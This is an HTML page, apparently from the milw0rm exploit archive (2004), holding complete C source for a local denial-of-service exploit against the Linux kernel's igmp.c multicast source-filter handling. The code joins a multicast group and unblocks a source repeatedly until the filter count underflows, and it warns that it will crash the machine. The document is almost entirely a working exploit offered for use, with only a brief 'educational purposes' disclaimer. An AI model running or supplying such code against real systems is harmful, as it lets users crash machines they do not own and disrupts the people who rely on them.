<html>
<head>
<title>Linux Kernel (<= 2.6.9, 2.4.22-28) (igmp.c) Local Denial of Service Exploit</title>
<pre>
/*
* Linux igmp.c local DoS
* Warning: this code will crash your machine!
*
* gcc -O2 mreqfck.c -o mreqfck
*
* Copyright (c) 2004  iSEC Security Research. All Rights Reserved.
*
* THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED &quot;AS IS&quot;
* AND WITHOUT ANY WARRANTY. COPYING, PRINTING, DISTRIBUTION, MODIFICATION
* WITHOUT PERMISSION OF THE AUTHOR IS STRICTLY PROHIBITED.
*
*/

#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;linux/types.h&gt;

#define MCAST_INCLUDE                   1
#define IP_MSFILTER                     41

#define IP_UNBLOCK_SOURCE               37
#define IP_BLOCK_SOURCE                 38

struct ip_msfilter
{
   __u32 imsf_multiaddr;
   __u32 imsf_interface;
   __u32 imsf_fmode;
   __u32 imsf_numsrc;
   __u32 imsf_slist[1];
};

struct ip_mreq_source
{
   __u32 imr_multiaddr;
   __u32 imr_interface;
   __u32 imr_sourceaddr;
};

void
fatal (const char *message)
{
   printf (&quot;\n&quot;);
   if (!errno)
     {
         fprintf (stdout, &quot;FATAL: %s\n&quot;, message);
     }
   else
     {
         fprintf (stdout, &quot;FATAL: %s (%s) &quot;, message,
                  (char *) (strerror (errno)));
     }
   printf (&quot;\n&quot;);
   fflush (stdout);
   exit (1);
}

int
main ()
{
   int s, r, l;
   struct ip_mreqn mr;
   struct ip_msfilter msf;
   struct ip_mreq_source ms;
   in_addr_t a1, a2;

   s = socket (AF_INET, SOCK_DGRAM, 0);
   if (s &lt; 0)
       fatal (&quot;socket&quot;);

//      first join mcast group
   memset (&amp;mr, 0, sizeof (mr));
   mr.imr_multiaddr.s_addr = inet_addr (&quot;224.0.0.199&quot;);
   l = sizeof (mr);
   r = setsockopt (s, SOL_IP, IP_ADD_MEMBERSHIP, &amp;mr, l);
   if (r &lt; 0)
       fatal (&quot;setsockopt&quot;);

//      add source filter count=1
   memset (&amp;ms, 0, sizeof (ms));
   ms.imr_multiaddr = inet_addr (&quot;224.0.0.199&quot;);
   ms.imr_sourceaddr = inet_addr (&quot;4.5.6.7&quot;);
   l = sizeof (ms);
   r = setsockopt (s, SOL_IP, IP_BLOCK_SOURCE, &amp;ms, l);
   if (r &lt; 0)
       fatal (&quot;setsockopt2&quot;);

//      del source filter count = 0
//      imr_multiaddr &amp; imr_interface must correspond to ADD
   memset (&amp;ms, 0, sizeof (ms));
   ms.imr_multiaddr = inet_addr (&quot;224.0.0.199&quot;);
   ms.imr_sourceaddr = inet_addr (&quot;4.5.6.7&quot;);
   l = sizeof (ms);
   r = setsockopt (s, SOL_IP, IP_UNBLOCK_SOURCE, &amp;ms, l);
   if (r &lt; 0)
       fatal (&quot;setsockopt2&quot;);

//      del again, count = -1
   memset (&amp;ms, 0, sizeof (ms));
   ms.imr_multiaddr = inet_addr (&quot;224.0.0.199&quot;);
   ms.imr_sourceaddr = inet_addr (&quot;4.5.6.7&quot;);
   l = sizeof (ms);
   r = setsockopt (s, SOL_IP, IP_UNBLOCK_SOURCE, &amp;ms, l);
   if (r &lt; 0)
       fatal (&quot;setsockopt3&quot;);

//      crash
   memset (&amp;ms, 0, sizeof (ms));
   ms.imr_multiaddr = inet_addr (&quot;224.0.0.199&quot;);
   ms.imr_sourceaddr = inet_addr (&quot;4.5.6.7&quot;);
   l = sizeof (ms);
   r = setsockopt (s, SOL_IP, IP_UNBLOCK_SOURCE, &amp;ms, l);
   if (r &lt; 0)
       fatal (&quot;setsockopt4&quot;);

   getchar ();

   return 0;
}

// milw0rm.com [2004-12-14]
</pre>
</html>

